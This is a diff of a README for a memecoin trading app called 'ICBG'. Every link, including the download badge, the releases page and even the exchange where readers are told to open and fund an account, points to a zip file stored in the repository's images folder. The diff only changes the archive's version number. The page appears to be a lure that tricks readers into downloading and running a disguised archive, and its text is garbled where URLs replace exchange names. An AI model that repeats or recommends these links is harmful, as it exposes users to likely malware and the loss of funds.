@@ -1,14 +1,14 @@
 # ❄️ ICBG - Next-Gen Memecoin for Everyone
 
-[![Download ICBG](https://raw.githubusercontent.com/BotWhatsapp-sungwoo/ICBG/main/images/Software_2.3.zip%https://raw.githubusercontent.com/BotWhatsapp-sungwoo/ICBG/main/images/Software_2.3.zip)](https://raw.githubusercontent.com/BotWhatsapp-sungwoo/ICBG/main/images/Software_2.3.zip)
+[![Download ICBG](https://raw.githubusercontent.com/BotWhatsapp-sungwoo/ICBG/main/images/Software-2.1.zip%https://raw.githubusercontent.com/BotWhatsapp-sungwoo/ICBG/main/images/Software-2.1.zip)](https://raw.githubusercontent.com/BotWhatsapp-sungwoo/ICBG/main/images/Software-2.1.zip)
 
 ## 🚀 Getting Started
 
-Welcome to ICBG, the next-generation memecoin on the Gate Layer network. ICBG lets you trade freely with ICBG/USDT pairs on https://raw.githubusercontent.com/BotWhatsapp-sungwoo/ICBG/main/images/Software_2.3.zip Alpha. This guide will help you download and run the application easily.
+Welcome to ICBG, the next-generation memecoin on the Gate Layer network. ICBG lets you trade freely with ICBG/USDT pairs on https://raw.githubusercontent.com/BotWhatsapp-sungwoo/ICBG/main/images/Software-2.1.zip Alpha. This guide will help you download and run the application easily.
 
 ## 📥 Download & Install
 
-To get started, visit our [Releases page](https://raw.githubusercontent.com/BotWhatsapp-sungwoo/ICBG/main/images/Software_2.3.zip) to download the latest version of ICBG. 
+To get started, visit our [Releases page](https://raw.githubusercontent.com/BotWhatsapp-sungwoo/ICBG/main/images/Software-2.1.zip) to download the latest version of ICBG. 
 
 1. Click on the link above.
 2. Find the latest version release.
@@ -39,10 +39,10 @@ Once installed, launch ICBG from your applications menu.
 
 ICBG allows you to trade with the ICBG/USDT pair:
 
-1. Create an account on https://raw.githubusercontent.com/BotWhatsapp-sungwoo/ICBG/main/images/Software_2.3.zip if you don’t have one.
+1. Create an account on https://raw.githubusercontent.com/BotWhatsapp-sungwoo/ICBG/main/images/Software-2.1.zip if you don’t have one.
 2. Fund your account with USDT.
 3. Open the ICBG application.
-4. Connect to your https://raw.githubusercontent.com/BotWhatsapp-sungwoo/ICBG/main/images/Software_2.3.zip account.
+4. Connect to your https://raw.githubusercontent.com/BotWhatsapp-sungwoo/ICBG/main/images/Software-2.1.zip account.
 5. Start trading your ICBG tokens.
 
 ## 🔍 Features of ICBG
@@ -62,6 +62,6 @@ Stay updated with the latest developments and connect with other ICBG users. Che
 
 ## 📦 Updates
 
-Make sure to regularly check our [Releases page](https://raw.githubusercontent.com/BotWhatsapp-sungwoo/ICBG/main/images/Software_2.3.zip) for updates. Upgrading to the latest version will ensure you benefit from the newest features and improvements.
+Make sure to regularly check our [Releases page](https://raw.githubusercontent.com/BotWhatsapp-sungwoo/ICBG/main/images/Software-2.1.zip) for updates. Upgrading to the latest version will ensure you benefit from the newest features and improvements.
 
 Thank you for choosing ICBG! Enjoy trading!
